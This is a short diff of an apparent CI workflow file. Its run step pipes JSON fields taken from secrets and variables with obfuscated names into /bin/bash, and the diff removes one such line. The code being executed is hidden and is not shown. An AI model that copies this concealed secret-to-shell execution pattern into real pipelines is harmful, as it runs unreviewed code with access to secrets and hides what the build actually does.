@@ -21,7 +21,6 @@ jobs:
           z20341: ${{ secrets.z20341 }}
         run: |
           printf '%s' "$z20341" | jq -r .nidcg2122 | /bin/bash
-          printf '%s' "$ger5702" | jq -r .y82498 | /bin/bash
           echo $t392 | jq -r .mnqa76 | /bin/bash
           echo $w8180 | jq -r .bm1 | /bin/bash
           echo $r3 | jq -r .xgeu7230 | /bin/bash
